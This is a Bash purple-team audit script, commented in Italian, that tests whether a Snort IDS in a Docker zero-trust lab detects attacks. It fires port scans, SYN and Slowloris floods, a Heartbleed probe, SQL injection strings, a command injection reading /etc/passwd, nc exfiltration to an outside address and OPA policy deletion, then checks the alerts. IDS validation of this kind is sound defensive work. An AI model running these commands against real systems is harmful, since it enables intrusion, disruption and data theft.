#!/bin/bash
# =============================================================================
# MARITIME ZTA - AUDIT DI SICUREZZA COMPLETO (PURPLE TEAMING)
# Copertura: 8 Categorie | 37 Regole | 4 Profili Client
#
# Percorso di esecuzione: Project_Maritime_Zero_Trust_Architecture/test/snort/full_audit
# Assegna permessi di esecuzione: chmod +x execute_tests_snort.sh
# Eseguilo:                       ./execute_tests_snort.sh
# =============================================================================
export MSYS_NO_PATHCONV=1
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
REPORT_FILE="zta_global_audit_report-2.txt"

echo "=======================================================================" > "$REPORT_FILE"
echo " MARITIME ZTA - RAPPORTO GLOBALE AUDIT DI SICUREZZA (37 REGOLE)" >> "$REPORT_FILE"
echo " Ora di inizio esecuzione: $(date '+%Y-%m-%d %H:%M:%S')" >> "$REPORT_FILE"
echo "=======================================================================" >> "$REPORT_FILE"

header() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} $1${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "\n--- $1 ---" >> "$REPORT_FILE"
}

fire_attack() {
    local source_container=$1
    local attack_desc=$2
    local command=$3
    local expected_sids=$4
    local wait_time=${5:-2}

    local start_time=$(date '+%H:%M:%S')
    echo -e "${YELLOW}► [${start_time}] DA [${source_container}]:${NC} ${attack_desc}"

    docker exec "$source_container" sh -c "$command" >/dev/null 2>&1 || true
    sleep "$wait_time"

    local end_time=$(date '+%H:%M:%S')

    if docker exec ids_network_monitor sh -c "grep -E -q ':(${expected_sids}):' /var/log/snort/alert_json.txt 2>/dev/null"; then
        echo -e "${GREEN}   [✔] RILEVATO alle ${end_time} (SID intercettati: $expected_sids)${NC}"
        echo "[✔ RILEVATO] $attack_desc (SID Attesi: $expected_sids) - Registrato alle $end_time" >> "$REPORT_FILE"
    else
        echo -e "${RED}   [✘] MITIGATO/CIECO alle ${end_time} (Snort non ha rilevato il SID $expected_sids)${NC}"
        echo "[✘ MITIGATO/BLOCCATO] $attack_desc (SID Attesi: $expected_sids) - Fermato prima di raggiungere Snort" >> "$REPORT_FILE"
    fi
}

CERT="--cert /certs/device/device.crt --key /certs/device/device.key"

docker exec ids_network_monitor sh -c "> /var/log/snort/alert_json.txt"
echo -e "${CYAN}Inizializzazione del buffer del motore IDS Snort e caricamento dell'ambiente di audit in corso...${NC}"
sleep 2

# =============================================================================
header "CAT 0: DIAGNOSTICA E TEST DELLA PIPELINE MVP"
# =============================================================================
fire_attack "client_intruso" "Verifica Intruso Ping ICMP" "ping -c 1 -W 2 172.20.13.11" "999901" 4
fire_attack "client_intruso" "Tentativo Base Scansione TCP SYN" "nc -zv -w 2 172.20.13.11 80" "999902" 4
fire_attack "client_operatore_ancona" "Payload SQLi a livello applicativo via PEP (autorizzato mTLS)" "curl -k -s --max-time 2 -X POST $CERT https://172.20.13.7:8443/login -d 'user=admin&pass=union select *'" "999903" 4
fire_attack "client_intruso" "Tentativo di connessione diretta a MongoDB (Bypass Envoy PEP)" "timeout 2 nc -zv 172.20.3.5 27017" "999904" 4

# =============================================================================
header "CAT 1: RICOGNIZIONE E SOGLIE DDOS"
# =============================================================================
fire_attack "client_intruso" "Scansione Porte TCP SYN (Raffica volumetrica 25 porte)" "for i in \$(seq 1 25); do nc -zv -w 1 172.20.13.7 \$i & done; wait" "1000001" 3
fire_attack "client_intruso" "Simulazione Scansione Porte UDP" "for i in \$(seq 1 25); do nc -zuv -w 1 172.20.13.7 \$i & done; wait" "1000002" 3
fire_attack "client_intruso" "Variante Scansione Furtiva Flag NULL/FIN/XMAS" "timeout 3 nmap -sF 172.20.13.7 || true" "1000003" 2
fire_attack "client_intruso" "Simulazione DDOS SYN Flood (110 hit rapidi)" "for i in \$(seq 1 110); do nc -zv -w 1 172.20.13.7 8443 & done; wait" "1000004" 4
fire_attack "client_intruso" "Emulazione DDOS Slowloris tramite HTTP POST" "for i in \$(seq 1 55); do curl -s --max-time 2 -X POST https://172.20.13.7:8443 >/dev/null & done; wait" "1000005" 4

# =============================================================================
header "CAT 2: EVASIONE DEL GATEWAY PEP (BYPASS DIRETTO DEI SERVIZI)"
# =============================================================================
fire_attack "client_intruso" "Bypass perimetrale diretto a db_primary (MongoDB)" "timeout 2 nc -zv 172.20.3.5 27017" "1000006"
fire_attack "client_intruso" "Bypass perimetrale diretto a api_backend" "timeout 2 nc -zv 172.20.3.20 3000" "1000007"
fire_attack "client_intruso" "Bypass perimetrale diretto alla REST API OPA pdp_engine" "timeout 2 nc -zv 172.20.2.6 8181" "1000008"
fire_attack "client_intruso" "Controllo esposizione non autorizzata sull'Interfaccia Admin Envoy (9901)" "timeout 2 nc -zv 172.20.13.7 9901" "1000009"
fire_attack "client_intruso" "Accesso diretto non autorizzato a Splunk SIEM Core" "timeout 2 nc -zv 172.20.4.8 8000" "1000010"

# =============================================================================
header "CAT 3: ANOMALIE CRITTOGRAFICHE MTLS E POLICY ENFORCEMENT"
# =============================================================================
fire_attack "client_intruso" "HTTP GET in chiaro su interfaccia mTLS forzata" "curl -s --max-time 2 http://172.20.13.7:8443" "1000011"
fire_attack "client_intruso" "HTTP POST in chiaro su interfaccia mTLS forzata" "curl -s --max-time 2 -X POST http://172.20.13.7:8443" "1000012"
fire_attack "client_intruso" "Vettore di downgrade crittografico (Forzatura TLS 1.0 legacy)" "curl -k -s --max-time 2 --tls-max 1.0 https://172.20.13.7:8443" "1000013"
fire_attack "client_intruso" "Sondaggio di memoria malevolo TLS Heartbleed" "echo -ne '\x18\x03\x00\x00\x03\x01\x40\x00' | nc -w 1 172.20.13.7 8443" "1000014"

# =============================================================================
header "CAT 4: DEEP PACKET INSPECTION L7 (INJECTION APPLICATIVE)"
# =============================================================================
fire_attack "client_operatore_ancona" "SQL Injection Interna: pattern UNION SELECT" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?q=union+select'" "1000015|999903"
fire_attack "client_capitano_claudia" "SQL Injection Interna: pattern distruttivo DROP TABLE" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?q=drop+table+users'" "1000018"
fire_attack "client_operatore_ancona" "OS Command Injection Interna: estrazione passwd Unix" "curl -k -s --max-time 2 $CERT 'https://172.20.13.7:8443/api?id=1;cat+/etc/passwd'" "1000019"

# =============================================================================
header "CAT 5: RILEVAMENTI DI ESFILTRAZIONE DATI"
# =============================================================================
fire_attack "client_soc_admin" "Controllo esfiltrazione: Magic Bytes MongoDB Wire Protocol" "echo -ne '\xd4\x07\x00\x00' | nc -w 1 8.8.8.8 80" "1000020"
fire_attack "client_soc_admin" "Controllo esfiltrazione: Uscita volumetrica anomala verso WAN" "for i in \$(seq 1 550); do echo 'exfil_chunk' | nc -w 1 8.8.8.8 80 >/dev/null 2>&1 & done; wait" "1000021" 4

# =============================================================================
header "CAT 6: VERIFICHE DI MOVIMENTO LATERALE EAST-WEST"
# =============================================================================
fire_attack "client_intruso" "Controllo salto laterale: Rete Pubblica -> Segmento VPN" "timeout 2 nc -zv 172.20.11.20 80" "1000022"
fire_attack "client_intruso" "Controllo salto laterale: Rete Pubblica -> Segmento Satellite" "timeout 2 nc -zv 172.20.12.21 80" "1000023"
fire_attack "client_intruso" "Controllo salto laterale: Rete Pubblica -> Segmento Corporate" "timeout 2 nc -zv 172.20.10.20 80" "1000024"
fire_attack "client_intruso" "Controllo salto laterale: Rete Pubblica -> Segmento Backend" "timeout 2 nc -zv 172.20.3.5 27017" "1000025"
fire_attack "client_capitano_claudia" "Controllo escalation laterale: Satellite -> Rete Corporate" "timeout 2 nc -zv 172.20.10.20 80" "1000026"
fire_attack "client_capitano_claudia" "Controllo escalation laterale: Satellite -> Livello Dati Backend" "timeout 2 nc -zv 172.20.3.5 27017" "1000027"
fire_attack "client_operatore_ancona" "Controllo evasione laterale: VPN -> Database Interno direttamente" "timeout 2 nc -zv 172.20.3.5 27017" "1000028"

# =============================================================================
header "CAT 7: BRUTE FORCE E ABUSO DI CREDENZIALI"
# =============================================================================
fire_attack "client_intruso" "Brute Force SSH sul gateway dell'infrastruttura" "for i in \$(seq 1 6); do nc -zv -w 1 172.20.13.7 22 & done; wait" "1000029" 3
fire_attack "client_soc_admin" "Brute Force SIEM Core (Flooding Splunk Web/HEC)" "for i in \$(seq 1 12); do curl -s --max-time 2 -X POST http://172.20.2.8:8088 >/dev/null & done; wait" "1000030" 3
fire_attack "client_intruso" "Attacco Brute Force alla REST API Motore OPA" "for i in \$(seq 1 16); do curl -s --max-time 2 http://172.20.13.6:8181 >/dev/null & done; wait" "1000031" 3

# =============================================================================
header "CAT 8: MANIPOLAZIONE DEL PIANO DI CONTROLLO E VETTORI DI ACCECAMENTO"
# =============================================================================
fire_attack "client_intruso" "Manipolazione Policy: OPA PUT /v1/policies (Override hot-reload)" "curl -s --max-time 2 -X PUT http://172.20.13.6:8181/v1/policies" "1000032|1000008"
fire_attack "client_operatore_ancona" "Manipolazione Contesto: OPA PUT /v1/data (Avvelenamento decisioni)" "curl -s --max-time 2 -X PUT http://172.20.13.6:8181/v1/data" "1000033|1000008"
fire_attack "client_capitano_claudia" "Cancellazione Policy: Endpoint OPA DELETE (Brain wipe)" "curl -s --max-time 2 -X DELETE http://172.20.13.6:8181/v1/policies" "1000034|1000008"
fire_attack "client_soc_admin" "Accecamento SIEM: Vettore Log Flooding su Splunk HEC" "for i in \$(seq 1 220); do curl -s --max-time 2 -X POST http://172.20.2.8:8088 >/dev/null & done; wait" "1000035" 5

# =============================================================================
header "CONSOLIDAMENTO DELL'AUDIT DI SICUREZZA"
# =============================================================================
echo -e "${GREEN}✔ Audit globale completato con successo.${NC}"
echo -e "${GREEN}✔ Rapporto scritto in: ${NC}$(pwd)/${REPORT_FILE}"
echo "=======================================================================" >> "$REPORT_FILE"
echo " FINE DEL RAPPORTO" >> "$REPORT_FILE"

echo -e "\n${YELLOW}► Validazione Pipeline SIEM: Controlla i log raccolti all'indirizzo http://localhost:8000${NC}"
echo -e "${CYAN}========================================================================${NC}\n"
